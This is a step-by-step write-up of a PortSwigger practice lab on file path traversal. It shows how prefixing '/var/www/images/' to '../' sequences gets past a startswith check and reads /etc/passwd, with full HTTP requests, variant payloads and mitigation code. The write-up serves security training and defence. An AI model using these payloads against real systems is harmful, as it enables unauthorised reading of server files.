# 📘 PortSwigger Lab: File Path Traversal, Validation of Start of Path

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-path-traversal/lab-validation-of-start-of-path  
> 🎯 Topic: Path Traversal — bypassing a prefix validation of the full file path  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📁 What Is Path Traversal](#path-traversal)
- [🧹 What "Validation of Start of Path" Means](#start-validation)
- [🔬 How the Working Payload Is Built](#payload-building)
- [🗂 How the Application Loads Images](#images)
- [❌ Vulnerable Validation Logic](#vulnerable-flow)
- [🔍 Step 1 — Find the Image Request](#step1)
- [🔍 Step 2 — Send the Request to Repeater](#step2)
- [🔍 Step 3 — Test Standard Traversal](#step3)
- [🔍 Step 4 — Test an Absolute Path](#step4)
- [🔍 Step 5 — Combine Prefix + Traversal](#step5)
- [🔍 Step 6 — Read `/etc/passwd`](#step6)
- [📨 Example Original Request](#original-request)
- [📨 Example Modified Request](#modified-request)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧭 How the Path Normalizes](#normalization)
- [🐧 Why `/etc/passwd` Is Used](#passwd)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit a **File Path Traversal** vulnerability in the product image display mechanism and retrieve the contents of:

```text
/etc/passwd
```

The application transmits the **full file path** via a request parameter and validates that the supplied path **starts with the expected folder**:

```text
/var/www/images/
```

To bypass the prefix check, the following value is placed in the:

```text
filename
```

parameter:

```text
/var/www/images/../../../etc/passwd
```

The path passes the `startswith` check, and after file-system normalization it resolves to:

```text
/etc/passwd
```

---

<a id="theory"></a>

## 🧠 Short Theory

**Path Traversal** is a vulnerability that allows user input to influence the path of a file read by the server.

In this lab the application does not build the path from a name — it accepts the **whole path** from the client and validates its beginning:

```text
filename=/var/www/images/58.jpg
```

The developer's assumption:

```text
If the path starts with /var/www/images/, it stays inside the image folder.
```

The flaw: a string check (`startswith`) is **not** a file-system check. The OS resolves `../` sequences only when the file is opened, and at that moment the path is normalized:

```text
/var/www/images/../../../etc/passwd
        ↓ normalization by the OS
/etc/passwd
```

---

<a id="idea"></a>

## 🧩 Core Idea

A standard payload without the prefix:

```text
../../../etc/passwd
```

is rejected, because it does **not** start with `/var/www/images/`.

The working payload **includes the required prefix** and then "eats" it with traversal sequences:

```text
/var/www/images/../../../etc/passwd
```

Processing:

```text
Validation:  starts with "/var/www/images/"  →  passes ✅
File system: /var/www/images/../../../etc/passwd  →  /etc/passwd
```

The developer checks the **string**. The OS interprets the **path**. Between these two moments, `../` removes the prefix directory by directory.

---

<a id="path-traversal"></a>

## 📁 What Is Path Traversal

Path Traversal is also known as:

```text
Directory Traversal
```

or:

```text
dot-dot-slash attack
```

The main sequence on Linux and Unix:

```text
../
```

means:

```text
move to the parent directory
```

Example starting directory:

```text
/var/www/images/
```

After one traversal:

```text
/var/www/
```

After two:

```text
/var/
```

After three:

```text
/
```

From the root, the attacker can reference:

```text
/etc/passwd
```

---

<a id="start-validation"></a>

## 🧹 What "Validation of Start of Path" Means

The application requires the user-supplied path to begin with the expected base folder:

```text
/var/www/images/
```

A simplified check:

```python
if not filename.startswith("/var/www/images/"):
    return "Access denied"
```

This blocks:

```text
filename=../../../etc/passwd
```

because the string does not start with the required prefix.

But the check only compares **text**. It does not understand that:

```text
/var/www/images/../../../etc/passwd
```

still starts with the prefix **and** still escapes the folder. Both facts are true at the same time.

---

<a id="payload-building"></a>

## 🔬 How the Working Payload Is Built

Take the required prefix:

```text
/var/www/images/
```

Append three upward traversals:

```text
../../..
```

Append the target file:

```text
/etc/passwd
```

Result:

```text
/var/www/images/../../../etc/passwd
```

Path resolution:

```text
/var/www/images/../   → /var/www/
/var/www/images/../../ → /var/
/var/www/images/../../../ → /
```

Then:

```text
/etc/passwd
```

is appended to the root, producing the final normalized path:

```text
/etc/passwd
```

---

<a id="images"></a>

## 🗂 How the Application Loads Images

The lab contains a vulnerability in the product image display feature.

When a user opens a product page, the browser sends a separate request:

```http
GET /image?filename=/var/www/images/58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

The parameter:

```text
filename
```

now contains the **full path**, not just a name. The server validates the prefix and then reads the file at that path.

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Validation Logic

A simplified vulnerable implementation:

```python
filename = request.args.get("filename")
if not filename.startswith("/var/www/images/"):
    return "Access denied"

path = filename
return open(path, "rb").read()
```

Vulnerable flow:

```text
User-controlled full path
        ↓
startswith("/var/www/images/") — passes
        ↓
Path used as-is
        ↓
File-system normalization resolves ../../
        ↓
Read /etc/passwd
```

---

<a id="step1"></a>

## 🔍 Step 1 — Find the Image Request

1. Open the lab.
2. Visit any product page.
3. Start Burp Suite.
4. Open:

```text
Proxy → HTTP history
```

5. Find the image request:

```http
GET /image?filename=/var/www/images/58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

Note: the value is already a full path, not just a file name.

---

<a id="step2"></a>

## 🔍 Step 2 — Send the Request to Repeater

Right-click the request and select:

```text
Send to Repeater
```

Burp Repeater allows you to:

- modify the `filename` value;
- resend the request;
- compare status codes and response lengths;
- inspect the response body.

---

<a id="step3"></a>

## 🔍 Step 3 — Test Standard Traversal

Replace the value with a plain traversal payload:

```text
../../../etc/passwd
```

Request:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Expected result: the request is rejected or the file is not returned, because the path does not start with `/var/www/images/`.

Conclusion: a prefix check exists.

---

<a id="step4"></a>

## 🔍 Step 4 — Test an Absolute Path

Try a direct absolute path:

```text
/etc/passwd
```

Request:

```http
GET /image?filename=/etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Also blocked: `/etc/passwd` does not start with `/var/www/images/`.

The next pentesting question:

```text
Does the application accept the full path and check only its beginning?
```

If yes, the prefix can be included inside the payload itself.

---

<a id="step5"></a>

## 🔍 Step 5 — Combine Prefix + Traversal

Replace the `filename` value with:

```text
/var/www/images/../../../etc/passwd
```

Modified request:

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

Click:

```text
Send
```

Logic:

```text
startsWith("/var/www/images/")  →  True ✅
normalization                  →  /etc/passwd
```

---

<a id="step6"></a>

## 🔍 Step 6 — Read `/etc/passwd`

The HTTP response contains the contents of the system file instead of image data:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

The lab is then marked:

```text
Solved
```

---

<a id="original-request"></a>

## 📨 Example Original Request

```http
GET /image?filename=/var/www/images/58.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
```

The client controls the full path value in:

```text
filename
```

---

<a id="modified-request"></a>

## 📨 Example Modified Request

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION-VALUE
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
```

Critical payload:

```text
/var/www/images/../../../etc/passwd
```

---

<a id="response"></a>

## 📥 Example Result

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316
```

Response body (excerpt):

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
```

The full response contains all standard `/etc/passwd` entries — a complete proof of arbitrary file read.

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Open the PortSwigger lab
2. Visit a product page
3. Find the /image?filename=... request in Burp HTTP history
4. Send the request to Repeater
5. Confirm that plain ../../../etc/passwd is blocked
6. Confirm that an absolute path /etc/passwd is blocked
7. Conclude: the application checks only the start of the path
8. Include the required prefix in the payload
9. Submit /var/www/images/../../../etc/passwd
10. Receive the contents of /etc/passwd
11. Confirm that the lab is marked Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. The Client Controls the Full Path

The application accepts a complete path in the `filename` parameter instead of a file identifier.

### 2. The Defense Checks Text, Not the Resolved Path

`startswith()` is a string comparison. It knows nothing about `..` semantics.

### 3. The Prefix Can Be Included in the Payload

Nothing prevents the legitimate prefix from being followed by traversal sequences.

### 4. The OS Normalizes the Path

`..` segments are resolved at file-open time, after the validation has already passed.

### 5. The Final Path Is Not Re-Validated

The application does not verify that the normalized path is still inside the base directory.

### 6. The Process Can Read the File

The web application has permission to read `/etc/passwd`, so its contents are returned.

---

<a id="normalization"></a>

## 🧭 How the Path Normalizes

```text
/var/www/images/../../../etc/passwd

step 1: /var/www/images/../  →  /var/www/
step 2: /var/www/../         →  /var/
step 3: /var/../             →  /
step 4: / + etc/passwd       →  /etc/passwd
```

Result:

```text
/etc/passwd
```

The same logic works for deeper directories — just add more `../` segments.

---

<a id="passwd"></a>

## 🐧 Why `/etc/passwd` Is Used

`/etc/passwd` is a standard Linux/Unix file with local user account information.

Line format:

```text
username:x:UID:GID:comment:home:shell
```

Example:

```text
root:x:0:0:root:/root:/bin/bash
```

It normally does **not** contain password hashes (they live in `/etc/shadow`), so it is safe to use as proof of arbitrary file read.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When the application validates a path, ask:

```text
Is the check on the string or on the resolved path?
```

```text
Can the required prefix be included in the payload?
```

```text
How many ../ segments are needed to reach the root?
```

```text
Is the full path accepted from the client at all?
```

Test sequence:

```text
1. Normal value: /var/www/images/58.jpg
2. Plain traversal: ../../../etc/passwd
3. Absolute path: /etc/passwd
4. Prefix + traversal: /var/www/images/../../../etc/passwd
5. Vary the number of ../ segments
6. Compare response body, status and length
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, compare:

### Prefix + 2 traversals

```text
/var/www/images/../../etc/passwd
```

### Prefix + 3 traversals (working)

```text
/var/www/images/../../../etc/passwd
```

### Prefix + 4 traversals (over-traversal)

```text
/var/www/images/../../../../etc/passwd
```

### Encoded traversal inside prefix

```text
/var/www/images/..%2f..%2f..%2fetc/passwd
```

### Windows-style variant

```text
C:\var\www\images\..\..\..\windows\win.ini
```

The working value for this lab:

```text
/var/www/images/../../../etc/passwd
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Using Traversal Without the Prefix

`../../../etc/passwd` is blocked — the path must start with the base folder.

### Mistake 2. Using Only an Absolute Path

`/etc/passwd` is also blocked for the same reason.

### Mistake 3. Wrong Number of `../` Segments

Too few segments leaves the path inside `/var/www/...`; the exact number must match the directory depth.

### Mistake 4. Forgetting That the OS Normalizes Paths

The string check and the file-system resolution are different stages.

### Mistake 5. Looking Only at the Status Code

Both success and failure may return `200 OK`. Inspect the body.

### Mistake 6. Expecting JPEG Data

After exploitation, the response contains text from `/etc/passwd`.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Accept Paths from the Client

Use an identifier:

```text
image_id=58
```

and map it server-side:

```python
allowed_images = {
    "58": "58.jpg",
    "59": "59.jpg",
}
```

### 2. Use an Allowlist

```python
if filename not in allowed_filenames:
    reject_request()
```

### 3. Normalize and Validate the Final Path

```python
base = os.path.realpath("/var/www/images")
target = os.path.realpath(os.path.join(base, user_input))
if not target.startswith(base + os.sep):
    reject_request()
```

### 4. Use `basename` as an Additional Control

```python
filename = os.path.basename(user_input)
```

### 5. Apply Least Privilege

The web process should only be able to read the files it actually needs.

### 6. Log Suspicious Values

```text
../
/var/www/images/../../
%2e%2e%2f
```

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Opened a product page
- [ ] Found the `/image?filename=...` request
- [ ] Identified the full-path parameter
- [ ] Sent the request to Repeater

### Validation Analysis

- [ ] Tested plain `../../../etc/passwd` — blocked
- [ ] Tested absolute `/etc/passwd` — blocked
- [ ] Concluded that only the start of the path is checked

### Exploitation

- [ ] Used `/var/www/images/../../../etc/passwd`
- [ ] Response contained `/etc/passwd` data
- [ ] Confirmed arbitrary file read
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The application validated that the supplied path **starts with** `/var/www/images/`, but it never checked where the path **ends after normalization**.

The payload:

```text
/var/www/images/../../../etc/passwd
```

passed the prefix check and was normalized by the file system to:

```text
/etc/passwd
```

Main lessons:

```text
A string check is not a path check.
```

```text
Validation must run on the final canonical path, not on the raw input.
```

```text
The normalized path must remain inside the approved base directory.
```

---

[⬆ Back to top](#top)
